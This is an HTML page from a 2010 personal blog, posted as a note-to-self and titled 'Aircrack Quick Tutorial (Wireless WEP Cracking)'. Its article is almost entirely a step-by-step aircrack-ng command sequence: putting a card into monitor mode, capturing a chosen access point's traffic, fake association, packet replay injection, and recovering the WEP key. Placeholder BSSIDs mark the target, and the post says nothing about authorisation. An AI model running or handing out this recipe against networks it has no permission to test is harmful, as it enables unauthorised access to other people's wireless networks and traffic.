@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+
+<head>
+	<meta charset="utf-8" />
+	<meta name="viewport" content="width=device-width" />
+
+	<title>Aircrack Quick Tutorial (Wireless WEP Cracking)</title>
+
+	<link rel="stylesheet" href="//blog.macuyiko.com/theme/css/normalize.css" />
+	<link rel="stylesheet" href="//blog.macuyiko.com/theme/css/foundation.min.css" />
+	<link rel="stylesheet" href="//blog.macuyiko.com/theme/css/style.css" />
+	<link rel="stylesheet" href="//blog.macuyiko.com/theme/css/pygments.css" />
+	<script src="//blog.macuyiko.com/theme/js/jquery-3.4.1.min.js"></script>
+	<link rel="preconnect" href="https://fonts.gstatic.com">
+	<link href="https://fonts.googleapis.com/css?family=Bitter:400,700|Source+Code+Pro&display=swap" rel="stylesheet">
+
+
+	<script type="text/javascript">
+		var waitForFinalEvent = (function () {
+			var timers = {};
+			return function (callback, ms, uniqueId) {
+				if (!uniqueId) uniqueId = "_";
+				if (timers[uniqueId]) clearTimeout(timers[uniqueId]);
+				timers[uniqueId] = setTimeout(callback, ms);
+			};
+		})();
+		var insertCaptions = function () {
+			$('#articlecontainer .caption').remove();
+			var width = $(window).width();
+			var onmobile = width < 1400; //>
+			var capclass = onmobile ? 'caption-below' : 'caption-aside';
+			$.each($('#articlecontainer img'), function (index, value) {
+				if ($(value).attr('alt') != undefined) {
+					var elem = $('<div class="caption ' + capclass + '">' + $(value).attr('alt') + '</div>');
+					if (onmobile) elem.insertAfter(value);
+					else elem.insertBefore(value);
+				}
+			});
+		};
+		$(function () {
+			$(window).resize(function () {
+				waitForFinalEvent(function () {
+					insertCaptions();
+				}, 500, "window.resize");
+			});
+			insertCaptions();
+		});
+	</script>
+	<script type="text/javascript">
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-60406-11']);
+		_gaq.push(['_trackPageview']);
+
+		(function () {
+			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+	</script>
+</head>
+
+<body>
+
+	<nav>
+		<div class="top-bar large-12 columns">
+			<h1><a href="//blog.macuyiko.com/">Bed Against The Wall</a></h1>
+		</div>
+	</nav>
+
+
+	<div class="row contentwrapper">
+		<div class="row">
+<div id="articlecontainer" class="large-9 columns large-centered">
+	<article>
+		<header>
+			<div class="article-info">Wed 03 November 2010, by Seppe "Macuyiko" vanden Broucke</div>
+			<div class="article-title"><a href="//blog.macuyiko.com/post/2010/aircrack-quick-tutorial-wireless-wep-cracking.html" rel="bookmark"
+			title="Permalink to Aircrack Quick Tutorial (Wireless WEP Cracking)">Aircrack Quick Tutorial (Wireless <span class="caps">WEP</span>&nbsp;Cracking)</a></div>
+		</header>
+	
+	    <p>Speaking of <a href="////blog.macuyiko.com/post/2010/ubuntu-1010-fixed-channel-mon0-1-aircrack-problem-with-iwl3945.html">wireless</a>&#8230;</p>
+<p>The following is just a quick note-to-self, because I always forget the exact commands and end up crawling around the <a href="http://www.aircrack-ng.org/doku.php">Aircrack wiki</a> for a bit. I though I&#8217;d posted this before, but I can&#8217;t seem to find&nbsp;it.</p>
+<h3><span class="caps">TTY1</span></h3>
+<div class="highlight"><pre><span></span><code>sudo airmon-ng start eth1
+# Assume monitor started on mon0...
+
+sudo airodump-ng mon0
+# Scout interesting APs
+
+sudo airodump-ng --channel X --bssid XX:XX:XX:XX:XX:XX -w output mon0
+# Make sure to replace &quot;X&quot;. This terminal is now dumping data
+</code></pre></div>
+
+<h3><span class="caps">TTY2</span></h3>
+<div class="highlight"><pre><span></span><code><span class="s s-Atom">sudo</span> <span class="s s-Atom">aireplay</span><span class="o">-</span><span class="s s-Atom">ng</span> <span class="o">-</span><span class="mi">1</span> <span class="mi">0</span> <span class="o">-</span><span class="s s-Atom">a</span> <span class="nv">XX</span><span class="o">:</span><span class="nv">XX</span><span class="o">:</span><span class="nv">XX</span><span class="o">:</span><span class="nv">XX</span><span class="o">:</span><span class="nv">XX</span><span class="o">:</span><span class="nv">XX</span> <span class="s s-Atom">mon0</span>
+<span class="s s-Atom">#</span> <span class="p">...</span> <span class="nv">Association</span> <span class="nf">successful</span> <span class="o">:-</span><span class="p">)</span>
+</code></pre></div>
+
+<p>Now start the attack. I like opening a new terminal for this.
+Don&#8217;t bother with the <span class="caps">ARP</span> request replay attack. The best method to use is the <code>-p 0841</code> one, especially when using a crappy wifi chip like me (<span class="caps">3945ABG</span>). Last time I checked, the advanced attack methods (KoreK chopchop, fragmentation, caffe-latte and Hirte) didn&#8217;t&nbsp;work.</p>
+<h3><span class="caps">TTY3</span></h3>
+<div class="highlight"><pre><span></span><code><span class="n">sudo</span><span class="w"> </span><span class="n">aireplay</span><span class="o">-</span><span class="n">ng</span><span class="w"> </span><span class="o">-</span><span class="mi">2</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">0841</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="nl">FF</span><span class="p">:</span><span class="nl">FF</span><span class="p">:</span><span class="nl">FF</span><span class="p">:</span><span class="nl">FF</span><span class="p">:</span><span class="nl">FF</span><span class="p">:</span><span class="n">FF</span><span class="w"> </span><span class="o">-</span><span class="n">b</span><span class="w"> </span><span class="nl">XX</span><span class="p">:</span><span class="nl">XX</span><span class="p">:</span><span class="nl">XX</span><span class="p">:</span><span class="nl">XX</span><span class="p">:</span><span class="nl">XX</span><span class="p">:</span><span class="n">XX</span><span class="w"> </span><span class="n">mon0</span>
+<span class="err">#</span><span class="w"> </span><span class="n">Wait</span><span class="w"> </span><span class="n">until</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">packet</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">captured</span><span class="p">.</span><span class="w"> </span><span class="n">It</span><span class="err">&#39;</span><span class="n">s</span><span class="w"> </span><span class="n">best</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">small</span><span class="w"> </span><span class="n">one</span><span class="w"> </span><span class="p">(</span><span class="k">Size</span><span class="err">:</span><span class="w"> </span><span class="mi">68</span><span class="p">).</span>
+
+<span class="err">#</span><span class="w"> </span><span class="n">Reinject</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">data</span><span class="o">-</span><span class="n">counter</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">TTY1</span><span class="w"> </span><span class="p">(</span><span class="n">airodump</span><span class="p">)</span><span class="w"> </span><span class="n">should</span><span class="w"> </span><span class="k">go</span><span class="w"> </span><span class="n">up</span><span class="p">.</span>
+</code></pre></div>
+
+<h3><span class="caps">TTY4</span></h3>
+<div class="highlight"><pre><span></span><code>sudo aircrack-ng -b XX:XX:XX:XX:XX:XX output*.cap
+</code></pre></div>
+
+<h3><span class="caps">TTY5</span>&nbsp;(optional)</h3>
+<div class="highlight"><pre><span></span><code>sudo aircrack-ng -K -b XX:XX:XX:XX:XX:XX output*.cap
+</code></pre></div>
+	</article>
+</div>
+
+		</div>
+
+		<footer class="row">
+			<div class="large-12 columns">
+				<hr />
+				<div class="row">
+					<p>Bed Against The Wall by Seppe "Macuyiko" vanden Broucke<br>
+						Unless mentioned otherwise, this work is licensed under a <a
+							href="http://creativecommons.org/licenses/by-sa/2.0/be/" rel="license">Creative Commons
+							Attribution-Share Alike 2.0 Belgium License</a>.<br>
+						Static blog engine powered by <a href="http://getpelican.com">Pelican</a>.</p>
+				</div>
+			</div>
+		</footer>
+	</div>
